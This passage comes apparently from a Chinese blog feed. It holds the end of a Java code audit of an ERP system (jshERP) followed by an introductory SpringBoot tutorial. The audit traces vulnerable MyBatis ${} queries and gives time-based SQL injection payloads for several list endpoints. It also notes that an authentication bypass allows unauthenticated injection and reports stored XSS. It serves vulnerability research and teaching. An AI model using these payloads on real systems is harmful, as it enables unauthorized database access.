Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817<br>Connection: close<br><br>GET /account/list?search=&#123;&quot;name&quot;:&quot;123&#x27; or sleep(5)--+&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;&#125;&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br><br>payload：<br>GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png"></p><p>在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 <strong>时间盲注生效</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png"></p><h3 id="DepotMapperEx-xml"><a href="#DepotMapperEx-xml" class="headerlink" title="DepotMapperEx.xml"></a>DepotMapperEx.xml</h3><p>通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。</p><p>再以DepotMapperEx.xml 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;select id=&quot;selectByConditionDepot&quot; parameterType=&quot;com.jsh.erp.datasource.entities.DepotExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;<br>  select dep.*,usr.username as principalName<br>  FROM jsh_depot dep<br>  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)<br>  where 1=1<br>  &lt;if test=&quot;name != null&quot;&gt;<br>    and dep.name like &#x27;%$&#123;name&#125;%&#x27;<br>  &lt;/if&gt;<br><br>-&gt;selectByConditionDepot<br>public interface DepotMapperEx &#123;<br><br>    List&lt;DepotEx&gt; selectByConditionDepot(<br>            @Param(&quot;name&quot;) String name,<br>            @Param(&quot;type&quot;) Integer type,<br>            @Param(&quot;remark&quot;) String remark,<br>            @Param(&quot;offset&quot;) Integer offset,<br>            @Param(&quot;rows&quot;) Integer rows);<br><br>-&gt;DepotService<br>public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception &#123;<br>        List&lt;DepotEx&gt; list=null;<br>        try&#123;<br>            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);<br>        &#125;catch(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        return list;<br>    &#125;<br><br>-&gt;select<br>@Override<br>    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception &#123;<br>        return getDepotList(map);<br>    &#125;<br><br>    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception &#123;<br>        String search = map.get(Constants.SEARCH);<br>        String name = StringUtil.getInfo(search, &quot;name&quot;);<br>        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &quot;type&quot;));<br>        String remark = StringUtil.getInfo(search, &quot;remark&quot;);<br>        String order = QueryUtils.order(map);<br>        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br><br>-&gt;select<br> /**<br>     * 查询<br>     * @param apiName<br>     * @param parameterMap<br>     * @return<br>     */<br>    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;<br>        if (StringUtil.isNotEmpty(apiName)) &#123;<br>            return container.getCommonQuery(apiName).select(parameterMap);<br>        &#125;<br>        return new ArrayList&lt;Object&gt;();<br>    &#125;<br><br>-&gt;select<br>@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)<br>    public String getList(@PathVariable(&quot;apiName&quot;) String apiName,<br>                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,<br>                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,<br>                        @RequestParam(value = Constants.SEARCH, required = false) String search,<br>                        HttpServletRequest request)throws Exception &#123;<br>        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>        parameterMap.put(Constants.SEARCH, search);<br>        PageQueryInfo queryInfo = new PageQueryInfo();<br>        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();<br>        if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;<br>            pageSize = 10;<br>        &#125;<br>        String offset = ParamUtils.getPageOffset(currentPage, pageSize);<br>        if (StringUtil.isNotEmpty(offset)) &#123;<br>            parameterMap.put(Constants.OFFSET, offset);<br>        &#125;<br>        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br>        objectMap.put(&quot;page&quot;, queryInfo);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>通过全局搜索到<code>like &#39;%${name}%&#39;</code>，定位 <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>，之后便在 <code>controller</code> 和 <code>service</code> 中找对应的文件名，在其中找到  <code>selectByConditionXxxxx</code> (基本上都在service中)，找到之后会发现 <code>selectByConditionXxxxx</code> 中所需的几个参数，都是来自 <code>select</code> 查询，跟进 <code>select</code> ，找到 <code>getXxxList</code> 方法解析 <code>select(Map&lt;String,String&gt; map)</code> 传入的前端请求参数，跟进 <code>select</code>，发现他是统一接口，通过 <code>apiName</code> 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>，<code>name、serialNo、remark</code> 都是对应的 <code>AccoutMapperEx</code> 的参数，那么就在 <code>name</code> 参数注入。</p><p>同样的漏洞有：</p><ul><li>AccoutMapperEx.xml</li><li>DepotMapperEx.xml </li><li>LogMapperEx.xml （功能点在“系统管理”-“日志管理”）<ul><li>payload : 111’ OR SLEEP(5) OR ‘1’&#x3D;’1</li></ul></li><li><font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xml（功能点在“商品管理”-“商品信息”）</font></li><li><font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xml（功能点在“基本资料”-“经手人管理”）</font></li><li><font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xml（功能点在“系统管理”-“角色管理”）</font></li><li><font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xml（功能点在“商品管理”-“计量单位”）</font></li><li><font style="color:#080808;background-color:#ffffff;">UserMapperEx.xml（功能点在“系统管理”-“用户管理”）</font></li></ul><h2 id="4、身份验证-鉴权"><a href="#4、身份验证-鉴权" class="headerlink" title="4、身份验证&amp;鉴权"></a>4、身份验证&amp;鉴权</h2><p>这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。</p><p>从图片看到，绕过身份验证也可以进行SQL注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png"></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><h2 id="1、存储型XSS"><a href="#1、存储型XSS" class="headerlink" title="1、存储型XSS"></a>1、<font style="color:rgb(31, 45, 61);">存储型XSS</font></h2><p>很多功能点都存在此漏洞，以下举三例：</p><h3 id="1-1-用户管理"><a href="#1-1-用户管理" class="headerlink" title="1.1 用户管理"></a>1.1 用户管理</h3><p>先新增一个用户</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png"></p><p>修改用户名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png"></p><p>出现弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png"></p><p>找到源码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png"></p><p>接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点</p><h3 id="1-2-商品信息"><a href="#1-2-商品信息" class="headerlink" title="1.2 商品信息"></a>1.2 商品信息</h3><p>增加商品：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png"></p><p>五个地方都会弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png"></p><h3 id="1-3-收入单"><a href="#1-3-收入单" class="headerlink" title="1.3 收入单"></a>1.3 收入单</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatis二级缓存反序列化的分析与复现</font></p><p><a href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">MyBatis远程代码执行漏洞CVE-2020-26945</font></p><p><a href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">Java 代码审计之华夏 ERP CMS v2.3</font></p><p><a href="https://www.freebuf.com/articles/web/347135.html"><font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font></a></p><p>【Java代码审计】华夏-ERPv2.3</p><p><a href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot</title>
    <link href="/2025/08/14/SpringBoot/"/>
    <url>/2025/08/14/SpringBoot/</url>
    
    <content type="html"><![CDATA[<h1 id="1、SpringBoot-简介"><a href="#1、SpringBoot-简介" class="headerlink" title="1、SpringBoot 简介"></a>1、SpringBoot 简介</h1><h2 id="1-1-什么是-SpringBoot"><a href="#1-1-什么是-SpringBoot" class="headerlink" title="1.1 什么是 SpringBoot"></a>1.1 什么是 SpringBoot</h2><p><font style="color:rgba(0, 0, 0, 0.9);">随着 Spring 不断的发展，涉及的领域越来越多，项目整合开发需要配合各种各样的文件，慢慢变得不那么易用简单，违背了最初的理念，甚至人称配置地狱。Spring Boot 正是在这样的一个背景下被抽象出来的开发框架，目的为了让大家更容易的使用 Spring 、更容易的集成各种常用的中间件、开源软件；</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以</font><strong><font style="color:rgba(0, 0, 0, 0.9);">约定大于配置的核心思想</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot的主要优点：</font></strong></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">为所有Spring开发者更快的入门</font></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">开箱即用</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，提供各种默认配置来简化项目配置</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">内嵌式容器简化Web项目</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">没有冗余代码生成和XML配置的要求</font></li></ul><h2 id="1-2-单体应用架构"><a href="#1-2-单体应用架构" class="headerlink" title="1.2 单体应用架构"></a>1.2 单体应用架构</h2><p>所谓单体应用架构（all in one）是指，我们将一个应用的中的所有应用服务都封装在一个应用中。</p><p>无论是ERP、CRM或是其他什么系统，你都把数据库访问，Web访问，等等各个功能放到一个war包内。</p><p>这样做的好处是，易于开发和测试；也十分方便部署；当需要扩展时，只需要将war复制多份，然后放到多个服务器上，再做个负载均衡就可以。</p><p>单体应用架构的缺点是，哪怕我要修改一个非常小的地方，我都需要停掉整个服务，重新打包、部署这个应用war包。特别是对于一个大型应用，我们不可能把所有内容都放在一个应用里面，我们如何维护、如何分工合作都是问题。</p><h2 id="1-3-微服务架构"><a href="#1-3-微服务架构" class="headerlink" title="1.3 微服务架构"></a><font style="color:rgba(0, 0, 0, 0.9);">1.3 微服务架构</font></h2><p><a href="https://www.ruanyifeng.com/blog/2022/04/microservice.html">微服务是什么？ - 阮一峰的网络日志</a></p><p><font style="color:rgba(0, 0, 0, 0.9);">all in one 的架构方式，我们把所有的功能单元放在一个应用里面。然后我们把整个应用部署到服务器上。如果负载能力不行，我们将整个应用进行水平复制，进行扩展，然后在负载均衡。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">所谓微服务架构，就是打破之前 all in one 的架构方式，把每个功能元素独立出来。把独立出来的功能元素的动态组合，需要的功能元素才去拿来组合，需要多一些时可以整合多个功能元素。所以微服务架构是对功能元素进行复制，而没有对整个应用进行复制。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">这样做的好处是：</font></p><ol><li><font style="color:rgba(0, 0, 0, 0.9);">节省了调用资源。</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">每个功能元素的服务都是一个可替换的、可独立升级的软件代码。</font></li></ol><h2 id="1-4-Hello，World-第一个-SpringBoot-程序"><a href="#1-4-Hello，World-第一个-SpringBoot-程序" class="headerlink" title="1.4 Hello，World - 第一个 SpringBoot 程序"></a><font style="color:rgba(0, 0, 0, 0.9);">1.4</font> Hello，World - 第一个 SpringBoot 程序</h2><p><font style="color:rgba(0, 0, 0, 0.9);">官网提供的创建网站：</font><a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303579.png"></p><p>下载解压之后：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303700.png"></p><p>正常情况下，idea 创建新项目即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303753.png"></p><p>创建一个接口测试：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303238.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303134.png"></p><p>maven 打包：</p><p><strong>注意：配置文件中的</strong><font style="color:#080808;background-color:#ffffff;"> </font><code>&lt;skip&gt;true&lt;/skip&gt; </code><font style="color:#080808;background-color:#ffffff;">，是让 </font><strong>spring-boot-maven-plugin 跳过执行</strong><font style="color:#080808;background-color:#ffffff;"> 的，所以 Maven 打包时不会生成可运行 JAR，自然就没有</font><code>Main-Class</code><font style="color:#080808;background-color:#ffffff;">，运行时就报 </font><strong>“没有主清单属性”</strong><font style="color:#080808;background-color:#ffffff;">。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303263.png"></p><p>修改之后可以正常运行：</p><p><code> java -jar helloworld-0.0.1-SNAPSHOT.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303329.png"></p><h1 id="2、原理"><a href="#2、原理" class="headerlink" title="2、原理"></a>2、原理</h1><h2 id="2-1-自动配置"><a href="#2-1-自动配置" class="headerlink" title="2.1 自动配置"></a>2.1 自动配置</h2><h3 id="2-1-1-pom-xml"><a href="#2-1-1-pom-xml" class="headerlink" title="2.1.1 pom.xml"></a>2.1.1 pom.xml</h3><h4 id="父依赖"><a href="#父依赖" class="headerlink" title="父依赖"></a>父依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 父依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 从远程仓库查找 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点进去，发现还有一个父依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里才是真正管理SpringBoot应用里面所有依赖版本的地方，SpringBoot的版本控制中心；</p><p>以后我们导入依赖默认是不需要写版本；但是如果导入的包没有在依赖中管理着就需要手动配置版本了；</p><h4 id="启动器-spring-boot-starter"><a href="#启动器-spring-boot-starter" class="headerlink" title="启动器 spring-boot-starter"></a>启动器 spring-boot-starter</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-comment">&lt;!--启动器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>springboot-boot-starter-xxx：就是spring-boot的场景启动器</p><p>spring-boot-starter-web：帮我们导入了web模块正常运行所依赖的组件；</p><p>SpringBoot将所有的功能场景都抽取出来，做成一个个的starter （启动器），只需要在项目中引入这些starter即可，所有相关的依赖都会导入进来 ， 我们要用什么功能就导入什么样的场景启动器即可 ；我们未来也可以自己自定义 starter；</p><h3 id="2-1-1-主启动类"><a href="#2-1-1-主启动类" class="headerlink" title="2.1.1 主启动类"></a>2.1.1 主启动类</h3><h4 id="默认的主启动类"><a href="#默认的主启动类" class="headerlink" title="默认的主启动类"></a>默认的主启动类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-comment">//@SpringBootApplication 来标注一个主程序类</span><br><span class="hljs-comment">//说明这是一个Spring Boot应用</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//将 springboot 应用启动</span><br>        SpringApplication.run(Springboot01HelloworldApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分析注解："><a href="#分析注解：" class="headerlink" title="分析注解："></a>分析注解：</h4><p>@SpringBootApplication</p><p><font style="color:rgba(0, 0, 0, 0.9);">作用：标注在某个类上说明这个类是SpringBoot的主配置类 ， SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303899.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//前四个都属于元注解</span><br><span class="hljs-comment">//指定这个注解可以标注的 Java 元素类型，ElementType.TYPE 表示只能标注在类、接口、枚举或注解类型上</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-comment">//指定注解生命周期，RUNTIME 表示注解会 保留到运行时，可以通过 反射 获取</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-comment">//表示注解会包含在 Javadoc 文档中</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-comment">//如果一个类加了这个注解，它的子类也会自动继承该注解</span><br><span class="hljs-meta">@Inherited</span><br><br><span class="hljs-comment">//springboot 的配置，标记当前类是 Spring Boot 配置类，本质上是 @Configuration 的一个特化</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-comment">//启用自动配置</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><br><span class="hljs-comment">//启动组件扫描，会扫描当前类所在包及子包的 Spring Bean,excludeFilters：排除某些类不被扫描。</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><br><span class="hljs-comment">//Spring 注解</span><br><span class="hljs-comment">//表示当前类是一个 Spring 配置类</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-comment">//Spring 在编译时会生成索引文件，用于快速扫描注解类，提高启动性能</span><br><span class="hljs-meta">@Indexed</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure 